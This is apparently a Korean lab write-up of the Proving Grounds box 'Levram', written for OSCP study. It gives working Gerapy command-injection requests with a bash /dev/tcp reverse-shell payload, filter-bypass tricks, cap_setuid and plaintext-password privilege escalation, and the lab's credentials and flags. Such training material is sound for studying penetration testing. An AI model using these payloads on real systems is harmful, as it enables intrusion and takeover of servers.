> 2단계부터 안 통한다 → **주입 자체가 실패.** 메타문자를 바꾸거나(`` ` `` → `$()` → `;` → 개행 `%0a`) 주입 지점을 바꾼다.
> **이 박스는 4444가 그대로 뚫려서 사다리를 건너뛰어도 됐지만, 막힌 박스에서는 이 구분이 30분을 가른다.**

**③ 필터를 만났을 때의 우회 순서** — 공백 필터: `${IFS}` · `<` · `{cmd,arg}` / 슬래시 필터: `${HOME}` · `$(echo L2Jpbg==|base64 -d)` / 키워드 필터: `b""ash` · `b\ash` · `/bin/b?sh` / 전면 인코딩: base64 래핑(2-5).

**④ 주입이 안 되면 다음 후보 경로는.** 관리 UI 계열에서 인증을 얻은 뒤의 우선순위는 이렇다:

1. **명령 실행 기능 그 자체** — "스크립트 실행"·"작업 등록"·"플러그인 설치"가 UI에 있으면 주입이 아니라 **정상 기능**으로 RCE다 (Jenkins Script Console 패턴)
2. **파일 업로드 → 웹루트/실행 경로**
3. **SSTI** — 템플릿을 사용자가 편집하는 기능
4. **경로 조작** — 백업·로그 뷰어의 `path` 파라미터로 `/etc/passwd`·`../` 읽기
5. **역직렬화** — 세션/쿠키/작업 정의가 pickle·Java serialized면

---

## 3. Foothold — CVE-2021-43857 명령주입

> [!danger] EDB 50640은 깨끗한 박스에서 그냥 죽는다
> `searchsploit -m 50640` 으로 받은 스크립트는 `/api/project/index` 응답에서 `dict3[0]['name']` 을 읽는다.
> **Levram에는 프로젝트가 0개**라서 곧바로 `IndexError`로 터진다.
> 브리핑은 "프로젝트 생성 기능을 통해 명령이 실행된다"고 하는데, 정확히는 **프로젝트 생성은 선행조건**이고 주입 지점은 `parse` 다.
> **프로젝트를 하나 만들고 나면 스크립트도 그대로 동작한다.**

선행조건 — 프로젝트 생성:

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ TOK=710dcf5387645f05a0484347be4a8509ea749008

┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s -X POST http://192.168.248.24:8000/api/project/create \
     -H "Authorization: Token $TOK" -H 'Content-Type: application/json' \
     -d '{"name":"pwn","description":"pwn"}'
{"id": 1, "name": "pwn", ...}
```

> [!warning] `-H 'Content-Type: application/json'` 를 빼면 400이 난다
> `curl -d` 의 기본 Content-Type은 `application/x-www-form-urlencoded` 다.
> DRF는 그 타입으로 온 본문을 **폼으로 파싱**하려 하므로, JSON 문자열이 통째로 하나의 키가 되어 필드를 못 찾는다.
> **"페이로드는 맞는데 400/필수 필드 누락"이 나오면 Content-Type부터 확인하라.**

주입 — 리스너를 먼저 띄우고:

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ tmux new-session -d -s levram 'rlwrap nc -lvnp 4444'

┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s -X POST http://192.168.248.24:8000/api/project/pwn/parse \
     -H "Authorization: Token $TOK" -H 'Content-Type: application/json' \
     -d '{"spider":"`/bin/bash -c '"'"'bash -i >& /dev/tcp/192.168.45.207/4444 0>&1'"'"'`"}'
```

> [!note] 리스너를 **먼저** 띄우는 이유와 플래그 해설
> | 조각 | 역할 |
> |---|---|
> | `tmux new-session -d -s levram` | 셸을 백그라운드 세션에 격리. 터미널을 닫아도 리버스셸이 안 죽는다 |
> | `rlwrap` | 방향키·히스토리·백스페이스를 살려준다. TTY 업그레이드 전까지의 생존 도구 |
> | `nc -l` | 리슨 모드 |
> | `-v` | 접속이 붙는 순간을 출력 |
> | `-n` | DNS 역조회 안 함 — 느려지고 흔적을 남긴다 |
> | `-p 4444` | 포트 지정 |
>
> **리스너가 없으면 페이로드는 조용히 실패하고, 재시도해도 같은 결과를 본다.** 명령주입은 블라인드라 실패 원인이 안 보인다. "리스너 먼저"는 반사 동작이어야 한다.

```bash
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.24] 46158
bash: cannot set terminal process group (846): Inappropriate ioctl for device
app@ubuntu:~/gerapy$ id
uid=1000(app) gid=1000(app) groups=1000(app)
```

> [!note] `cannot set terminal process group` 은 에러가 아니다
> 리버스셸에는 제어 터미널(controlling TTY)이 없어서 `bash -i`가 잡 제어를 설정하려다 실패한 것뿐이다. **셸은 정상 동작한다.**
> 이 메시지를 보면 곧바로 TTY 업그레이드로 넘어간다:
> ```
> python3 -c 'import pty;pty.spawn("/bin/bash")'
> Ctrl+Z ; stty raw -echo; fg ; Enter ; export TERM=xterm
> ```
> 이 박스는 Django가 파이썬으로 돌므로 `python3`가 **반드시 있다** — 서비스 스택이 곧 사용 가능한 도구 목록이라는 점을 기억하라.
> (`python3`가 없는 최소 설치라면 `script -qc /bin/bash /dev/null`. [[Hawat]] 참조)

프로젝트를 만든 뒤라면 스크립트 방식도 동일하게 통한다:

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ python3 50640.py -t 192.168.248.24 -p 8000 -L 192.168.45.207 -P 4445
[*] Found project: pwn
```

user 플래그:

```bash
app@ubuntu:~$ cat /home/app/local.txt
367447fc2401d598d4368ed12eb7ca2d
```

---

## 4. 권한상승

### 4-1. 셸을 잡자마자 칠 것

```bash
id                                   # 소속 그룹 (docker·lxd·adm·sudo가 보이면 즉시 그쪽)
sudo -l                              # NOPASSWD 항목
find / -perm -4000 -type f 2>/dev/null   # SUID
getcap -r / 2>/dev/null              # ← 이 박스의 정답
cat /etc/crontab; ls -la /etc/cron.*     # 크론
cat /etc/systemd/system/*.service    # ← 이 박스의 두 번째 정답
```

> [!note] 원문에 기록이 남은 것은 `id`·`getcap`·`app.service` 셋이다
> `sudo -l`·SUID·크론의 실제 출력은 노트에 남아 있지 않다. `[가정]` — 이 박스에서는 세 항목이 소득 없이 끝났고, 그래서 기록되지 않았다.
> **시험에서는 소득이 없어도 "돌렸다"는 사실을 남겨라.** 나중에 되돌아와 같은 걸 다시 돌리는 것이 가장 흔한 시간 낭비다.

### 4-2. 배경 지식 — Linux capabilities

> [!note] capability가 무엇인가 — SUID를 조각낸 것
> 전통적 유닉스에는 권한이 둘뿐이었다: **uid 0(전능)** 과 **그 외(무력)**. `ping`이 raw 소켓을 열려면 root여야 했고, 그래서 `ping`에 SUID root를 걸었다. **`ping` 하나가 뚫리면 곧바로 전체 root**가 되는 구조다.
> Linux 2.2부터 root의 권한을 **약 40개의 조각(capability)** 으로 쪼갰다. `ping`에는 `cap_net_raw` 하나만 주면 된다. 뚫려도 raw 소켓 이상은 못 한다.
>
> | | SUID | File capability |
> |---|---|---|
> | 부여 방법 | `chmod u+s` | `setcap cap_xxx=ep <파일>` |
> | 확인 방법 | `find / -perm -4000` | **`getcap -r /`** |
> | 얻는 권한 | 파일 소유자의 **전체 권한** | **지정한 조각만** |
> | `ls -la`에서 보이나 | **보인다** (`-rwsr-xr-x`) | **안 보인다** ← 놓치기 쉬운 이유 |
> | 파일 복사 시 | 대개 유지 | **사라진다** (확장속성이라 `cp`·타 파일시스템 이동에서 소실) |

**`=ep` 표기를 읽는 법.** capability는 파일에 세 집합으로 저장된다.

| 문자 | 집합 | 의미 |
|---|---|---|
| `p` | **Permitted** | 프로세스가 *가질 수 있는* 권한 |
| `e` | **Effective** | 실행 즉시 *활성화*되는가 (이 비트가 없으면 프로그램이 스스로 `capset()`으로 켜야 한다) |
| `i` | Inheritable | 자식 exec에 물려주는가 |

`cap_setuid=ep` = **"CAP_SETUID를 허용하고, 실행하는 순간 켠 상태로 시작한다"**. 프로그램이 아무것도 안 해도 바로 쓸 수 있다는 뜻이다.

**`CAP_SETUID`가 왜 root가 되는가.** 이 capability는 **UID를 임의로 바꿀 수 있는 권한**(`setuid`/`setreuid`/`setresuid`/`setfsuid`)이다. 파이썬 인터프리터가 이 권한을 들고 있으므로:

```
python3.10 실행 → CAP_SETUID가 effective 상태
  → os.setuid(0) 호출이 성공 → 프로세스의 uid/euid = 0
  → os.system('/bin/bash') → 그 bash가 uid 0을 물려받는다 → root 셸
```

**인터프리터에 capability를 붙이는 것이 왜 치명적인가.** 컴파일된 바이너리(`ping`)는 정해진 일만 한다. 인터프리터는 **사용자가 준 아무 코드나 그 권한으로 실행**한다. `setcap`을 인터프리터에 거는 순간 그것은 "조각난 권한"이 아니라 **범용 권한 부여**가 된다.

> [!tip] 위험한 capability 목록 — 보이면 즉시 GTFOBins
> | capability | 얻는 것 |
> |---|---|
> | `cap_setuid` | uid 변경 → **직접 root** |
> | `cap_setgid` | gid 변경 |
> | `cap_dac_read_search` | **모든 파일 읽기** (`/etc/shadow`) — DAC 우회 |
> | `cap_dac_override` | **모든 파일 쓰기** (`/etc/passwd`에 root 계정 추가) |
> | `cap_sys_admin` | 사실상 root — 마운트·네임스페이스 |
> | `cap_sys_ptrace` | 다른 프로세스 메모리 주입 (root 프로세스에 셸코드) |
> | `cap_sys_module` | 커널 모듈 로드 → 커널 레벨 root |
> | `cap_chown` / `cap_fowner` | 소유권·권한 검사 우회 |
> | `cap_net_raw` / `cap_net_bind_service` / `cap_net_admin` | **대개 정상.** 스니핑·저번호 포트 바인드 |

### 4-3. Privesc A — `python3.10` cap_setuid

```bash
app@ubuntu:~$ getcap -r / 2>/dev/null
/snap/core20/1518/usr/bin/ping cap_net_raw=ep
/snap/core20/1891/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/python3.10 cap_setuid=ep          ← 이것
/usr/bin/ping cap_net_raw=ep
```

`ping`·`mtr-packet`의 `cap_net_raw`는 정상 설정이다. **`python3.10`에 `cap_setuid`가 붙은 것만이 비정상**이다. 노이즈 속에서 이걸 골라내는 게 요령이다.

> [!tip] `getcap` 출력을 3초 안에 분류하는 법
> | 이 출력의 행 | 판정 | 근거 |
> |---|---|---|
> | `ping cap_net_raw=ep` (×3, snap 포함) | **정상** | 현대 배포판이 `ping`의 SUID를 대체한 표준 설정. snap은 같은 바이너리의 버전별 사본이라 중복이 뜬다 |
> | `mtr-packet cap_net_raw=ep` | **정상** | mtr의 백엔드 — ping과 같은 이유 |
> | `gst-ptp-helper cap_net_bind_service,cap_net_admin=ep` | **정상** | GStreamer PTP 시각 동기화 헬퍼. 패키지 기본값 |
> | **`python3.10 cap_setuid=ep`** | **비정상** | ① capability가 **네트워크 계열이 아니고** ② 대상이 **인터프리터**다 |
>
> **판별 규칙 둘만 외우면 된다:**
> 1. **`cap_net_*` 는 거의 항상 노이즈다.** 그 외(`setuid`·`setgid`·`dac_*`·`sys_*`·`chown`)가 보이면 정답 후보.
> 2. **대상이 인터프리터·아카이버·디버거면 무조건 정답 후보** — `python`·`perl`·`ruby`·`node`·`php`·`tar`·`rsync`·`gdb`·`openssl`·`vim`.

```bash
app@ubuntu:~$ /usr/bin/python3.10 -c "import os;os.setuid(0);os.system('/bin/bash')"
root@ubuntu:~/gerapy# id
uid=0(root) gid=1000(app) groups=1000(app)
```

> [!warning] `os.setgid(0)`을 같이 넣으면 실패한다
> ```
> PermissionError: [Errno 1] Operation not permitted
> ```
> 붙어 있는 capability는 **`cap_setuid` 하나뿐**이라 gid는 못 바꾼다. GTFOBins 원문 그대로 `setuid`만 호출할 것.
> 결과적으로 `gid=1000(app)`이 남는다 — `proof.txt`를 읽기엔 충분하지만 **깨끗한 root 컨텍스트는 아니다.**

> [!danger] 일반화 — **capability는 정확히 부여된 것만 쓸 수 있다**
> `os.setgid(0)`은 `CAP_SETGID`를 요구한다. 부여된 것은 `CAP_SETUID`뿐 → `EPERM`.
> GTFOBins의 `cap_setuid` 항목이 `setuid`만 부르는 것은 **간결하게 쓴 게 아니라 그것이 정확한 최대치이기 때문**이다.
> **"더 완전해 보이도록" 원문에 `setgid`·`setgroups`를 덧붙이면 되던 것이 안 되고, 원인을 엉뚱한 데서 찾게 된다.**
> 같은 이유로 `cap_dac_read_search`가 있다고 파일을 *쓰려* 하면 안 된다 — 그건 `cap_dac_override`다.

### 4-4. Privesc B — systemd 유닛 파일의 평문 비밀번호

`/etc/systemd/system/*.service`는 기본이 world-readable이다. 셸을 잡으면 반사적으로 훑는다.

```bash
app@ubuntu:~$ cat /etc/systemd/system/app.service
[Unit]
Description=Gerapy app service

# root:4!m?C%7k@Xb?XNH0!>6K          ← 주석에 root 비밀번호

[Service]
User=app
Type=simple
ExecStart=/bin/bash /home/app/run.sh

[Install]
WantedBy=multi-user.target
```

> [!note] 유닛 파일에서 항상 읽는 4줄
> | 지시자 | 왜 보는가 |
> |---|---|
> | `User=` | **비어 있으면 root로 돈다** — 그 서비스를 뚫으면 곧바로 root ([[Hub]]·[[Hawat]] 패턴). 여기는 `User=app`이라 해당 없음 |
> | `ExecStart=` | 가리키는 스크립트가 **쓰기 가능하면** 그 자체가 권한상승 경로다. `/home/app/run.sh`는 `app` 소유일 가능성이 높지만 서비스도 `app`으로 돌아 이득이 없다 |
> | `Environment=` / `EnvironmentFile=` | 자격증명이 여기 박힌다 |
> | **주석(`#`)** | ← **이 박스의 정답.** 관리자가 메모를 남기는 자리다 |
>
> 열거 명령: `cat /etc/systemd/system/*.service`, `systemctl cat <서비스>`, `grep -rIn -iE 'pass|pwd|secret|token|key' /etc/systemd/ 2>/dev/null`

```bash
app@ubuntu:~$ su root
Password: 4!m?C%7k@Xb?XNH0!>6K
root@ubuntu:/home/app/gerapy# id
uid=0(root) gid=0(root) groups=0(root)
```

> [!warning] `su`는 TTY를 요구한다
> 업그레이드 안 된 리버스셸에서 `su`를 치면 `su: must be run from a terminal`이 난다.
> **`su`를 쓰기 전에 반드시 pty를 확보하라** (`python3 -c 'import pty;pty.spawn("/bin/bash")'`).
> 이 함정에 걸리면 "비밀번호가 틀렸다"고 오판하고 멀쩡한 자격증명을 버리게 된다.

**B가 A보다 낫다** — uid/gid/groups 전부 0인 완전한 root이고, 같은 비밀번호로 **SSH 직접 로그인**이 되므로 리버스셸에 의존하지 않는 안정적인 발판이 된다.

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ ssh root@192.168.248.24
root@ubuntu:~# cat proof.txt
aaa7973d6eecab6c5268390c53579801
```

### 4-5. 두 경로 비교 — "root가 됐다"가 아니라 "안정적인가"

| | **A — cap_setuid** | **B — 평문 비밀번호** |
|---|---|---|
| 결과 컨텍스트 | `uid=0 gid=1000(app)` — **반쪽** | `uid=0 gid=0 groups=0` — 완전 |
| `proof.txt` 읽기 | 가능 | 가능 |
| gid 기반 접근 제어 통과 | **불가** (예: `shadow`·`docker` 그룹 전용 리소스) | 가능 |
| 리버스셸이 끊기면 | **처음부터 다시** (웹 → 주입 → 셸 → getcap) | **`ssh root@` 한 줄로 복귀** |
| 랩 리버트 후 재현 | 재현 가능 | 재현 가능 |
| 시험 증거 촬영 | 가능하나 `id`가 지저분하다 | 깔끔하다 |

> [!tip] 시험에서 경로가 둘이면 **"재접속 비용"** 으로 고른다
> 24시간 시험에서 진짜 비용은 셸을 얻는 것이 아니라 **셸을 잃고 다시 얻는 것**이다.
> 자격증명(비밀번호·SSH 키)을 주는 경로가 항상 우선이고, 익스플로잇 체인에 의존하는 경로는 차선이다.
> 그리고 **둘 다 확인해서 둘 다 기록한다** — 한쪽이 리버트 후 안 통할 수 있다.

---

## 5. 플래그 / 자격증명

| | |
|---|---|
| `local.txt` | `367447fc2401d598d4368ed12eb7ca2d` |
| `proof.txt` | `aaa7973d6eecab6c5268390c53579801` |

| 대상 | 자격증명 |
|---|---|
| Gerapy 웹 UI (8000) | `admin` / `admin` |
| 시스템 root | `root` / `4!m?C%7k@Xb?XNH0!>6K` |
| API 토큰 (세션) | `710dcf5387645f05a0484347be4a8509ea749008` |

> [!tip] 시험 증거 형식 연습
> 시험에서는 플래그 값만으로는 인정되지 않는다. **한 화면에** 담아야 한다:
> ```bash
> whoami; hostname; ip a; cat /root/proof.txt
> ```
> 이 박스는 경로 B로 잡은 root 셸에서 찍는 것이 맞다 — A로 찍으면 `id`에 `gid=1000(app)`이 남아 채점자에게 설명이 필요해진다.
> `local.txt`도 `app` 셸에서 동일 형식으로 한 번 더 찍는다.

---

## 6. 막혔던 지점 / 시행착오

### ① EDB 50640이 `IndexError`로 즉사했다 — **실제로 겪음**

`searchsploit -m 50640` 으로 받아 그대로 돌리자 프로젝트 목록을 읽는 지점에서 터졌다. 스크립트는 `/api/project/index` 응답에서 `dict3[0]['name']` 을 꺼내는데, **Levram에는 프로젝트가 0개**다.

- **잘못된 결론**: "타겟이 취약하지 않다" 또는 "익스플로잇이 이 버전에 안 맞는다"
- **실제 원인**: 스크립트가 **암묵적 전제**(프로젝트 최소 1개)를 깔고 있었다
- **어떻게 알아챘는가**: 예외가 HTTP 응답이 아니라 **파이썬 트레이스백**이었다. 타겟이 거부한 것이 아니라 **로컬 스크립트가 자기 데이터 처리에서 죽은 것**이다

> [!danger] 예외의 발생 위치가 곧 진단이다
> | 증상 | 의미 |
> |---|---|
> | 타겟이 `401`/`403`/`404` 반환 | 인증·경로 문제. 익스플로잇 이전 단계 |
> | 타겟이 `500` 반환 | **주입은 도달했으나 페이로드가 깨졌다** — 좋은 신호다 |
> | **로컬 파이썬 트레이스백** | 타겟과 무관. **스크립트를 읽어라** |
> | 무응답/타임아웃 | 아웃바운드 차단 또는 페이로드가 셸을 블로킹 |

**해법은 "스크립트 고치기"가 아니라 "전제 만들어주기"였다.** `POST /api/project/create` 로 프로젝트 `pwn`을 하나 만들자 스크립트가 그대로 동작했다. 스크립트를 디버깅하는 것보다 **환경을 스크립트가 기대하는 모양으로 맞춰주는 편이 훨씬 빠르다.**

> [!tip] 공개 익스플로잇을 돌리기 전 30초 읽기 체크리스트
> 1. **하드코딩된 값** — 포트·경로·URL 프리픽스·`http`/`https`
> 2. **암묵적 전제** — 목록의 `[0]`, "적어도 하나 존재", 특정 설정 활성화 ← **이 박스의 함정**
> 3. **인증 흐름** — 토큰을 어디서 얻고 어느 헤더에 넣는가
> 4. **페이로드 생성 지점** — 내 IP/포트가 실제로 어디 들어가는가
> 5. **버전 가드** — 스크립트가 버전을 확인하고 거부하는가

### ② 푸터 버전 문자열을 믿을 뻔했다 — **실제로 겪음**

`Gerapy v0.9.7` 이라는 푸터가 있었다. 이것만 보고 넘어갔어도 **결과적으로는 맞았다.** 그런데 파일 크기를 대조하니 **26541 vs 26533, 8바이트 차이**가 났다.

- **무엇을 알아챘는가**: 이 푸터는 **정품 산출물이 아니라 출제자가 삽입한 것**이다 (정품 0.9.7은 `Gerapy All Rights Reserved.`로 버전 문자열이 없다)
- **왜 위험한가**: 이번엔 참이었지만, **출제자가 조작할 수 있는 값은 언제든 거짓일 수 있다.** [[Hub]]에서 실제로 그렇게 틀렸다
- **비용**: 정품 wheel 다운로드 + `cmp -l` 대조. 몇 분

> [!danger] "맞았으니 괜찮다"가 아니다
> **결과가 맞은 것과 방법이 옳은 것은 다르다.** 조작 가능한 단일 근거로 판정하는 습관은 언젠가 반드시 대가를 치른다.
> 이 박스에서 배울 것은 "0.9.7이었다"가 아니라 **"버전 판정을 근거의 독립성으로 설계했다"** 는 절차 그 자체다.

### ③ `os.setgid(0)`을 덧붙였다가 `EPERM` — **실제로 겪음**

GTFOBins의 `cap_setuid` 원문은 `os.setuid(0)`만 부른다. "더 완전한 root가 되겠지" 하며 `os.setgid(0)`을 앞에 넣자:

```
PermissionError: [Errno 1] Operation not permitted
```

- **원인**: `setgid`는 `CAP_SETGID`를 요구한다. 부여된 것은 `cap_setuid` **하나뿐**이다
- **오진 위험**: 이 에러를 보고 "capability 경로가 안 통한다"고 판단하면 **멀쩡한 권한상승을 통째로 버린다**
- **교훈**: **GTFOBins 원문을 임의로 "보강"하지 마라.** 그 한 줄이 정확히 그 capability의 최대치다

### ④ 브리핑 문구가 주입 지점을 잘못 가리켰다 — **실제로 겪음**

PG 브리핑은 "프로젝트 생성 기능을 통해 명령이 실행된다"고 적혀 있다. 문자 그대로 읽으면 **`/api/project/create` 의 `name`·`description`에 주입을 시도하게 된다.**

실제 주입 지점은 `/api/project/<name>/parse` 의 `spider` 다. 생성은 **선행조건**일 뿐이다.

> [!warning] 힌트·브리핑·CVE 요약문은 **압축 손실**이 있다
> "프로젝트 생성 기능을 통해"는 공격 사슬을 한 문장으로 줄이다 보니 **선행조건과 주입 지점이 뭉개진** 표현이다.
> **1차 자료(패치 커밋·익스플로잇 코드·URLconf 덤프)가 요약문을 이긴다.**
> 여기서는 404가 뱉어준 `^api/project/(\S+)/parse` 가 브리핑보다 정확했다.

### ⑤ 첫 root에서 멈추지 않은 것이 정답이었다 — **실제로 겪음**

경로 A(`cap_setuid`)로 이미 `root@ubuntu#` 프롬프트를 잡았다. 여기서 `proof.txt`를 읽고 박스를 닫아도 **점수는 같다.** 그런데 `id`가 이렇게 나왔다:

```
uid=0(root) gid=1000(app) groups=1000(app)
```

- **무엇이 걸렸는가**: `uid=0`인데 `gid`와 `groups`가 `app`이다. **완전한 root 컨텍스트가 아니다**
- **왜 계속 팠는가**: ① 시험 증거 스크린샷에 `gid=1000(app)`이 찍히면 설명이 필요해진다 ② 리버스셸이 끊기면 웹 익스플로잇부터 전부 다시 해야 한다
- **소득**: `/etc/systemd/system/app.service` 주석에서 평문 root 비밀번호 → 완전한 root + **SSH 재접속 경로**

> [!tip] "root가 됐다"는 종료 조건이 아니다
> 종료 조건은 **"끊겨도 1분 안에 돌아올 수 있는가"** 다.
> `id` 출력이 `uid=0 gid=0 groups=0`이 아니면 **아직 반쪽**이고, 자격증명(비밀번호·SSH 키·`/etc/shadow` 해시)을 확보하지 못했으면 **발판이 아니라 외줄**이다.
> root를 잡은 직후에도 **최소 3분은 더 쓴다** — `cat /etc/shadow`, `ls -la /root/.ssh/`, `history`, `/etc/systemd/system/*.service`, `.env`·백업 파일. 이 박스에서는 그 3분이 통째로 이득이었다.

### ⑥ `/root/email3.txt`를 열지 않기로 판단했다 — **실제로 겪음**

root를 잡은 뒤 `/root`에 `email3.txt`(8바이트)가 있었다. 열지 않고 넘어갔다.

- **판단 근거**: 8바이트는 플래그(32자 MD5) 크기가 아니다. 파일명도 스토리 소품 계열이다
- **[가정]** 실제로 열어 확인한 기록이 원문에 없으므로, "무관하다"는 것은 **크기와 이름에서 나온 추론**이다. 타겟이 정지돼 재확인은 불가능하다

> [!warning] 이 판단은 **시험에서는 뒤집어야 한다**
> 랩에서는 "플래그와 무관해 보이면 넘어간다"가 효율이지만, **시험에서는 `cat` 한 번이 1초**다.
> `/root`·`/home/*`의 모든 파일은 **일단 다 읽는다.** 8바이트짜리가 다른 호스트의 비밀번호인 경우가 실제로 있다.
> **비용이 1초인 확인을 "무관해 보인다"는 이유로 생략하지 마라** — 생략의 기대손실이 확인 비용보다 항상 크다.

### ⑦ 이 유형에서 흔히 막히는 지점

> [!note] 아래는 이 박스의 실제 시행착오가 아니다
> 원문 노트에 기록이 없어 재현 검증이 불가능하다. **동일 유형(관리 UI + 인증 후 명령주입 + capability privesc)에서 반복적으로 시간을 잡아먹는 지점**을 일반화해 적는다. `[가정]`

| 증상 | 흔한 원인 | 확인/해법 |
|---|---|---|
| 모든 API가 401 | `Bearer`를 붙였다 | DRF는 **`Token`** 스킴 (1-4 참조) |
| 400 / "필수 필드 누락" | `Content-Type` 누락 | `-H 'Content-Type: application/json'` |
| 주입 페이로드에 **아무 반응 없음** | dash가 `/dev/tcp`를 모른다 | `/bin/bash -c '...'` 로 감싸기 (2-5) |
| 백틱이 통째로 문자열로 남음 | JSON 층에서 이스케이프됨 / URL 인코딩 이중 적용 | `--data-urlencode` 또는 base64 래핑 |
| 응답이 오래 걸리다 타임아웃 | **리버스셸이 붙어서** 요청 핸들러가 안 끝난 것 | **정상이다.** 리스너를 확인하라 |
| 리버스셸이 안 붙음 | 아웃바운드 필터 | 443·80·53으로 포트 변경. 이 박스는 4444가 그대로 통했다 |
| `getcap` 결과가 비어 보임 | `2>/dev/null` 없이 에러에 파묻힘 / `getcap` 미설치 | `getcap -r / 2>/dev/null`. 없으면 `find / -type f -exec getcap {} \;` 또는 `/usr/sbin/getcap` |
| `su`가 "must be run from a terminal" | pty 없음 | `python3 -c 'import pty;pty.spawn("/bin/bash")'` 먼저 (4-4) |
| `DEBUG=True`인데 404가 예쁜 페이지 | 커스텀 `handler404` 또는 `DEBUG=False` | 존재하는 뷰에 **잘못된 타입**을 넣어 500을 유발해본다 |

| 프로젝트 생성은 200인데 `parse`가 404 | 프로젝트 이름 URL 인코딩 / 이름에 특수문자 | 이름은 `pwn`처럼 영숫자로만 |
| 두 번째 시도부터 리버스셸이 안 붙음 | 앞선 요청의 핸들러가 셸을 물고 있다 | 리스너 포트를 바꿔 재시도 (원문에서 4444 → 4445) |

### ⑧ 시간 배분 — 어디에 썼고 어디서 손절했어야 하는가

| 단계 | 성격 | 손절선 |
|---|---|---|
| Nmap `-p-` | 필수 | — |
| 404 URLconf 덤프 확인 | **10초, 최고 ROI** | 여기서 라우팅을 얻으면 디렉터리 브루트포싱 **금지** |
| 기본 자격증명 시도 | **1분** | `admin:admin`·`admin:password`·제품명 조합. 5개 안에 안 되면 다음으로 |
| **버전 정밀 판정(증거 A·B·C)** | **가장 오래 걸린 구간** | ⚠️ **시험이었다면 과잉이다.** "0.9.8 미만인가"만 확인하면 충분했다 (2-1 압축판) |
| EDB 50640 디버깅 | 잘못된 방향 | **트레이스백이 로컬이면 스크립트를 읽는다.** 10분 넘기면 `curl` 수동으로 전환 |
| 수동 `curl` 주입 | 정답 | — |
| `getcap` privesc | 30초 | 셸 잡고 나서 열거 6줄 안에 나온다 |
| `app.service` 발견 | 30초 | 위와 동일 |

> [!danger] 이 박스의 진짜 교훈 — **정밀도와 속도는 트레이드오프다**
> 증거 3개 교차 검증은 **학습 자산으로는 최고, 시험 전술로는 과잉**이다.
> 시험에서는 "패치 경계의 어느 쪽인가"만 정하고 즉시 익스플로잇으로 넘어간 뒤, **실패했을 때만** 정밀 판정으로 돌아온다.
> 반대로 **보고서를 쓸 때는** 이 절차가 그대로 근거 자료가 된다. 상황에 따라 깊이를 조절하는 것이 요령이다.

**시간을 벌어준 판단 3개** — 다음 박스에서도 그대로 재사용할 것:

1. **404 본문을 눈으로 읽었다.** 스캐너를 돌리기 전에 한 번 읽은 덕에 열거 단계가 통째로 사라졌다.
2. **익스플로잇이 죽었을 때 타겟이 아니라 스크립트를 의심했다.** 트레이스백의 발생 위치가 진단이었다.
3. **첫 root에서 멈추지 않았다.** 3분을 더 써서 SSH 재접속 경로를 얻었다.

**시간을 태운 판단 1개**: 증거 B(30개 자산 대조)까지 간 것. 판정에 필요한 정보는 증거 A에서 이미 나와 있었다.

---

## 7. OSCP 시험 관점

### 7-1. 시험 금지 도구 점검

> [!danger] ⚠️ 이 박스에서 **시험 금지 도구를 쓴 곳은 없다** — 다만 경계를 알고 있어야 한다
> 사용한 도구는 `nmap`·`curl`·`nc`·`tmux`·`rlwrap`·`md5sum`·`ssh`, 그리고 **공개 익스플로잇 스크립트(EDB 50640)** 다. 전부 허용 범위다.
> 공개 PoC/익스플로잇 스크립트는 **금지가 아니다.** 금지되는 것은 **취약점 탐지와 익스플로잇을 자동으로 묶어주는 프레임워크**다.

| 금지되는 것 | 이 박스에서 대체한 방법 (= 시험 자산) |
|---|---|
| **Metasploit** (시험 전체에서 1대 한정) · `msf` auxiliary/exploit 모듈 | `curl` 한 줄 명령주입. **Gerapy용 msf 모듈이 있더라도 `curl`이 더 빠르다** |
| **sqlmap** | 이 박스에는 SQLi가 없다 — 해당 없음 |
| **자동 익스플로잇 프레임워크** (AutoRecon 등의 자동 공격 단계, `nuclei` 자동 익스플로잇) | 404 URLconf 덤프 → 수동 엔드포인트 식별 |
| **자동 취약점 스캐너** (Nessus·OpenVAS·Nexpose) | 배너 → 버전 판정 → CVE 수동 대조 |
| `msfvenom` / `nc` / 직접 작성 스크립트 | **허용.** 마음껏 쓴다 |

**전 과정 수동 재현(시험용 최소 명령 4개)** — 스크립트 없이 이것만으로 끝난다:

```bash
# ① 토큰
curl -s -X POST http://TARGET:8000/api/user/auth -H 'Content-Type: application/json' \
     -d '{"username":"admin","password":"admin"}'
# ② 프로젝트 생성 (선행조건)
curl -s -X POST http://TARGET:8000/api/project/create \
     -H "Authorization: Token $TOK" -H 'Content-Type: application/json' \
     -d '{"name":"pwn","description":"pwn"}'
# ③ 리스너
rlwrap nc -lvnp 4444
# ④ 주입
curl -s -X POST http://TARGET:8000/api/project/pwn/parse \
     -H "Authorization: Token $TOK" -H 'Content-Type: application/json' \
     -d '{"spider":"`/bin/bash -c '"'"'bash -i >& /dev/tcp/KALI/4444 0>&1'"'"'`"}'
```

### 7-2. 일반화된 교훈

1. **버전은 출처가 다른 근거 2개 이상으로 확정한다.** 런타임 동작 차이(URL 패턴의 트레일링 슬래시) + 콘텐츠 해시 자산(webpack 번들명)이 교차해서 0.9.7이 나왔다. [[Hub]]에서는 근거 3개가 전부 "2019년 배포본 잔존물"이라는 **같은 출처**여서 틀렸다 — **근거의 개수가 아니라 독립성**이 관건이다. 이 박스의 푸터(증거 C)도 증거 B와 같은 파일에서 나왔으므로 판정에 세지 않았다.
2. **`WSGIServer` 배너 = Django 개발 서버 = `DEBUG=True` 의심.** 아무 경로나 때려서 스택트레이스/URLconf가 나오면 **디렉터리 열거를 건너뛴다.** 여기서는 404 하나로 `^api/project/(\S+)/parse` 라는 주입 지점을 그대로 얻었다.
3. **"인증 후 RCE" CVE를 봤으면 기본 자격증명부터 시도한다.** 인증 요구는 CVSS를 낮추지만 현실에서는 장벽이 아니다. 이 박스는 `admin:admin` 하나가 유일한 방벽이었다.
